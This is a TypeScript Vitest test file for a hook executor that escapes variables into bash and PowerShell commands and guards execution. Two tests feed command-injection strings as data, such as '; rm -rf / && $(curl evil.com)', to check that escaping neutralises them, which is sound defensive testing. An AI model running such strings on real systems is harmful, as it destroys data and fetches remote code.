import { describe, it, expect } from 'vitest';
import { HookExecutor } from '@/core/hooks/HookExecutor';
import type { HookInput } from '@/core/hooks/types';

const baseInput: HookInput = {
  hook_event_name: 'PreToolUse',
  session_id: 'sess_1',
  tool_name: 'browser_dom',
  tool_input: { action: 'click', file_path: '/tmp/test.txt' },
  cwd: '/home/user',
  current_url: 'https://example.com',
  current_domain: 'example.com',
  tab_id: 42,
};

describe('HookExecutor', () => {
  describe('escapeBash', () => {
    it('wraps simple string in single quotes', () => {
      expect(HookExecutor.escapeBash('hello')).toBe("'hello'");
    });

    it('escapes internal single quotes', () => {
      expect(HookExecutor.escapeBash("it's")).toBe("'it'\\''s'");
    });

    it('handles empty string', () => {
      expect(HookExecutor.escapeBash('')).toBe("''");
    });

    it('neutralizes shell metacharacters by wrapping in single quotes', () => {
      const dangerous = '; rm -rf / && $(curl evil.com)';
      const escaped = HookExecutor.escapeBash(dangerous);
      expect(escaped).toBe("'; rm -rf / && $(curl evil.com)'");
      // The literal characters are preserved but wrapped in single quotes,
      // so bash treats the entire string as a literal — no expansion.
      expect(escaped.startsWith("'")).toBe(true);
      expect(escaped.endsWith("'")).toBe(true);
    });
  });

  describe('escapePowerShell', () => {
    it('wraps simple string in single quotes', () => {
      expect(HookExecutor.escapePowerShell('hello')).toBe("'hello'");
    });

    it('doubles internal single quotes', () => {
      expect(HookExecutor.escapePowerShell("it's")).toBe("'it''s'");
    });

    it('handles empty string', () => {
      expect(HookExecutor.escapePowerShell('')).toBe("''");
    });
  });

  describe('substituteVariables', () => {
    it('replaces $TOOL_NAME with bash-escaped value', () => {
      const result = HookExecutor.substituteVariables('echo $TOOL_NAME', baseInput);
      expect(result).toBe("echo 'browser_dom'");
    });

    it('replaces $FILE_PATH with bash-escaped value', () => {
      const result = HookExecutor.substituteVariables('cat $FILE_PATH', baseInput);
      expect(result).toBe("cat '/tmp/test.txt'");
    });

    it('replaces $ARGUMENTS with escaped JSON', () => {
      const result = HookExecutor.substituteVariables('echo $ARGUMENTS', baseInput);
      expect(result).toContain("'");
      // JSON is inside quotes
      const inner = result.replace('echo ', '');
      expect(inner.startsWith("'")).toBe(true);
    });

    it('replaces $SESSION_ID', () => {
      const result = HookExecutor.substituteVariables('echo $SESSION_ID', baseInput);
      expect(result).toBe("echo 'sess_1'");
    });

    it('replaces $CWD', () => {
      const result = HookExecutor.substituteVariables('cd $CWD', baseInput);
      expect(result).toBe("cd '/home/user'");
    });

    it('replaces $CURRENT_URL', () => {
      const result = HookExecutor.substituteVariables('curl $CURRENT_URL', baseInput);
      expect(result).toBe("curl 'https://example.com'");
    });

    it('replaces $CURRENT_DOMAIN', () => {
      const result = HookExecutor.substituteVariables('echo $CURRENT_DOMAIN', baseInput);
      expect(result).toBe("echo 'example.com'");
    });

    it('replaces $TAB_ID', () => {
      const result = HookExecutor.substituteVariables('echo $TAB_ID', baseInput);
      expect(result).toBe("echo '42'");
    });

    it('replaces multiple variables in one string', () => {
      const result = HookExecutor.substituteVariables(
        '$TOOL_NAME on tab $TAB_ID',
        baseInput,
      );
      expect(result).toBe("'browser_dom' on tab '42'");
    });

    it('handles missing optional fields with empty escaped strings', () => {
      const minimalInput: HookInput = {
        hook_event_name: 'SessionStart',
        session_id: 's1',
      };
      const result = HookExecutor.substituteVariables(
        '$TOOL_NAME $CWD $TAB_ID',
        minimalInput,
      );
      expect(result).toBe("'' '' ''");
    });

    it('uses PowerShell escaping when shell is powershell', () => {
      const input: HookInput = {
        hook_event_name: 'PreToolUse',
        session_id: 'sess_1',
        tool_name: "it's",
      };
      const result = HookExecutor.substituteVariables(
        'echo $TOOL_NAME',
        input,
        'powershell',
      );
      // PowerShell doubles single quotes
      expect(result).toBe("echo 'it''s'");
    });

    it('prevents command injection via tool_name', () => {
      const maliciousInput: HookInput = {
        hook_event_name: 'PreToolUse',
        session_id: 'sess_1',
        tool_name: "'; rm -rf /; echo '",
      };
      const result = HookExecutor.substituteVariables('echo $TOOL_NAME', maliciousInput);
      // The value is wrapped in single quotes with internal quotes escaped
      // so the shell treats it as a literal string, not commands
      expect(result).not.toContain("echo ''; rm");
      expect(result).toContain("'\\''");
    });
  });

  describe('exitCodeToOutcome', () => {
    it('maps 0 to success', () => {
      expect(HookExecutor.exitCodeToOutcome(0)).toBe('success');
    });

    it('maps 2 to blocking_error', () => {
      expect(HookExecutor.exitCodeToOutcome(2)).toBe('blocking_error');
    });

    it('maps 1 to non_blocking_error', () => {
      expect(HookExecutor.exitCodeToOutcome(1)).toBe('non_blocking_error');
    });

    it('maps other codes to non_blocking_error', () => {
      expect(HookExecutor.exitCodeToOutcome(127)).toBe('non_blocking_error');
    });
  });

  describe('tryParseJson', () => {
    it('parses valid JSON', () => {
      expect(HookExecutor.tryParseJson('{"continue": false}')).toEqual({
        continue: false,
      });
    });

    it('returns undefined for invalid JSON', () => {
      expect(HookExecutor.tryParseJson('not json')).toBeUndefined();
    });

    it('returns undefined for empty string', () => {
      expect(HookExecutor.tryParseJson('')).toBeUndefined();
    });

    it('returns undefined for undefined', () => {
      expect(HookExecutor.tryParseJson(undefined)).toBeUndefined();
    });

    it('trims whitespace before parsing', () => {
      expect(HookExecutor.tryParseJson('  {"ok": true}  ')).toEqual({ ok: true });
    });
  });

  describe('execute — extension mode', () => {
    // __BUILD_MODE__ is set to 'extension' in vitest.config.mjs
    it('returns non_blocking_error for command hooks in extension mode', async () => {
      const executor = new HookExecutor();
      const result = await executor.execute(
        { type: 'command', command: 'echo hello' },
        baseInput,
      );
      expect(result.outcome).toBe('non_blocking_error');
      expect(result.stderr).toContain('extension mode');
    });
  });

  describe('execute — recursion guard via depth parameter', () => {
    it('blocks execution at max depth', async () => {
      const executor = new HookExecutor();
      const result = await executor.execute(
        { type: 'command', command: 'echo hi' },
        baseInput,
        undefined,
        3, // MAX_RECURSION_DEPTH
      );
      expect(result.outcome).toBe('non_blocking_error');
      expect(result.stderr).toContain('recursion depth exceeded');
    });

    it('allows execution below max depth', async () => {
      const executor = new HookExecutor();
      const result = await executor.execute(
        { type: 'command', command: 'echo hi' },
        baseInput,
        undefined,
        2, // below max
      );
      // In extension mode this returns unsupported, not recursion error
      expect(result.stderr).not.toContain('recursion depth exceeded');
    });
  });

  describe('execute — missing fields', () => {
    it('returns error for command hook without command field', async () => {
      const executor = new HookExecutor();
      const result = await executor.execute(
        { type: 'command' },
        baseInput,
      );
      expect(result.outcome).toBe('non_blocking_error');
      expect(result.stderr).toContain('missing "command" field');
    });

    it('returns error for prompt hook without prompt field', async () => {
      const executor = new HookExecutor();
      const result = await executor.execute(
        { type: 'prompt' },
        baseInput,
      );
      expect(result.outcome).toBe('non_blocking_error');
      expect(result.stderr).toContain('missing "prompt" field');
    });

    it('returns error for HTTP hook without url field', async () => {
      const executor = new HookExecutor();
      const result = await executor.execute(
        { type: 'http' },
        baseInput,
      );
      expect(result.outcome).toBe('non_blocking_error');
      expect(result.stderr).toContain('missing "url" field');
    });
  });

  describe('execute — cancelled signal', () => {
    it('returns cancelled when signal is already aborted', async () => {
      const executor = new HookExecutor();
      const controller = new AbortController();
      controller.abort();
      const result = await executor.execute(
        { type: 'command', command: 'echo hi' },
        baseInput,
        controller.signal,
      );
      expect(result.outcome).toBe('cancelled');
    });
  });
});
